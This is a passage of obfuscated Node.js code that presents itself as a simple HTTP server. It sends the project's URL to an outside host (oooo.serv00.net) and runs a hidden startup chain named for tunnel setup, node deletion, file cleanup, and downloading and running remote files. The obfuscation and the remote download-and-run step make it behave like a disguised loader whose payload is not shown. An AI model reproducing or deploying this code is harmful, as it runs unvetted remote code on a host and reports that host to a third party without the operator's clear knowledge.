axios[_0x576d69(0x22a)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x576d69(0x262)}});return console[_0x576d69(0x220)](_0x576d69(0x260)),_0x1b7506;}catch(_0x8ffc2f){return console[_0x576d69(0x218)](_0x576d69(0x1b2)+_0x8ffc2f[_0x576d69(0x1b0)]),null;}}async function startserver(){const _0x15ccee=_0x277bbb;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x23a019){console[_0x15ccee(0x218)](_0x15ccee(0x1e9),_0x23a019);}}startserver()['catch'](_0x33b9a3=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x33b9a3);}),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
